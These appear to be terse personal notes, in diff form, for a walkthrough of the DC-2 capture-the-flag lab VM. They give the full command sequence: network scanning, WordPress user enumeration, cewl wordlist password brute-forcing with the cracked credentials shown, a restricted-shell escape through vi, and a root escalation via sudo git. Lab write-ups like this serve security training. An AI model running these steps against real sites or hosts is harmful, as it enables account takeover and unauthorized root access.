@@ -1,0 +1,42 @@
+ifconfig
+netdiscover -r 192.168.56.0/24 -i eth1
+nmap -p- 192.168.56.109 -A -v
+80 & 7744 open (7744 acting as ssh)
+nano /etc/hosts
+	Add 192.168.56.109 dc-2
+firefox -> 192.168.56.109
+flag tab + WP site
+dirb http://dc-2
+	wp-admin, wp-content
+wpscan --url http://dc-2 --enumerate
+	tom, jerry, admin
+man cewl
+cewl http://dc-2/ > pass.txt
+touch users.txt; nano users.txt (add tom, jerry, admin)
+wpscan --url http://dc-2/ -U users.txt -P pass.txt
+	[i] Valid Combinations Found:
+ | Username: jerry, Password: adipiscing
+ | Username: tom, Password: parturient
+login at dc-2/wp-admin
+Pages > flag2
+ssh tom@192.168.56.109 -p 7744
+vi flag3.txt
+ls ..
+ls ../jerry
+vi ../jerry/flag4.txt
+vi lol
+:set shell=/bin/bash
+:shell
+export PARTH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+cat flag3.txt
+su jerry
+ls su
+sudo -l
+	User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+sudo git help add
+!/bin/bash
+root lmao
+cd /root
+cat final-flag.txt
